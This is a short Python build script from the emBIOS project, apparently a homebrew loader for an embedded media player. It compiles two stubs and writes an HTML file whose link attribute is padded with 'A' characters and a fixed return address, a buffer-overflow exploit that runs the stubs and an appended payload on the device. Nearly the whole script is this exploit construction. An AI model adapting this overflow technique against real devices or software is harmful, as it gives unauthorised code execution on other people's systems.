#!/usr/bin/env python
#
#
#    Copyright 2010 TheSeven
#
#
#    This file is part of emBIOS.
#
#    emBIOS is free software: you can redistribute it and/or
#    modify it under the terms of the GNU General Public License as
#    published by the Free Software Foundation, either version 2 of the
#    License, or (at your option) any later version.
#
#    emBIOS is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
#    See the GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with emBIOS.  If not, see <http://www.gnu.org/licenses/>.
#
#


import sys
import os
import struct

if not os.path.exists(sys.path[0] + "/uclstub/build/uclstub.bin"):
    os.system("make -C " + sys.path[0] + "/uclstub")

if not os.path.exists(sys.path[0] + "/ftlstub/build/ftlstub.ucl"):
    os.system("make -C " + sys.path[0] + "/ftlstub")

file = open(sys.argv[1], "rb")
payload = file.read()
file.close()

file = open(sys.path[0] + "/uclstub/build/uclstub.bin", "rb")
uclstub = file.read()
file.close()

file = open(sys.path[0] + "/ftlstub/build/ftlstub.ucl", "rb")
ftlstub = file.read()
file.close()

exploit = "<a href=\"" + sys.argv[2].ljust(276, "A") + "%34%05%64%08\">a</a>"

file = open(sys.argv[3], "wb")
file.write(exploit + ftlstub.ljust(4096 - len(exploit) - len(uclstub), "\0") + uclstub + payload)
file.close()
